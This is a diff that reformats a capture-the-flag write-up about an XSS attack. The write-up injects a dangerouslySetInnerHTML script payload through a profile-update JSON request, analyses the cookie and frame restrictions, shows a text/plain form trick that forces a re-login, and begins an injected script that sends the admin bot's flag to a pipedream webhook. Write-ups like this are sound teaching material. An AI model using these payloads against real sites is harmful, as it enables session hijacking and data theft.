@@ -31,7 +31,15 @@ The network request to update a profile is a `POST` request to `/api/profile/upd
 The JS wraps the Custom Style inside the `style` attribute in `viewProgressStyle`. Let's try changing the payload:
 
 ```json
-{"bio":"","website":"","location":"","viewProgressStyle":{"style":{"height":"20px"}, "dangerouslySetInnerHTML": {"__html": "<script>alert(1)</script>"}}}
+{
+    "bio": "",
+    "website": "",
+    "location": "",
+    "viewProgressStyle": {
+        "style": {"height": "20px"},
+        "dangerouslySetInnerHTML": {"__html": "<script>alert(1)</script>"}
+    }
+}
 ```
 
 The alert is shown! It confirms the XSS vulnerability through the user profile page.
@@ -49,13 +57,13 @@ To explore further on the possible restrictions:
 
 - HTTP response header: `X-Frame-Options: DENY`. It means `<frame>`, `<iframe>`, `<embed>`, `<object>` won't work. (`middleware.ts`)
 - Cookie options are as below (`lib/session.ts`). It means the top-level navigations with `GET` request will have the cookies sent, esp. admin's cookies.
-    ```
-        cookieOptions: {
+    ```javascript
+    cookieOptions: {
         secure: false,
         httpOnly: true,
         maxAge: 60 * 60 * 24,
         sameSite: 'Lax'
-      },
+    },
     ```
 - The admin bot waits for extra 5 seconds after visiting the given URL. It will give enough time for our script to trigger the re-login in a new window and exfiltrate the flag. (`lib/bot.ts`)
 
@@ -100,7 +108,7 @@ attacker.document.write(`
       form.method = 'POST';
       form.enctype = 'text/plain';
       form.target = 'login_target';
-      var input = document.createElement('input');
+      const input = document.createElement('input');
       input.name = '{"username":"user2","password":"password123","ignore":"';
       input.value = '"}';
       form.appendChild(input);
@@ -128,7 +136,7 @@ setTimeout(function() {
 JS Script to be injected (`xss.js`)
 
 ```javascript
-var WEBHOOK = 'https://<my-account>.m.pipedream.net/?v=1';
+const WEBHOOK = 'https://<my-account>.m.pipedream.net/?v=1';
 function toStr(o) {
 	return btoa(unescape(encodeURIComponent(o)));
 }
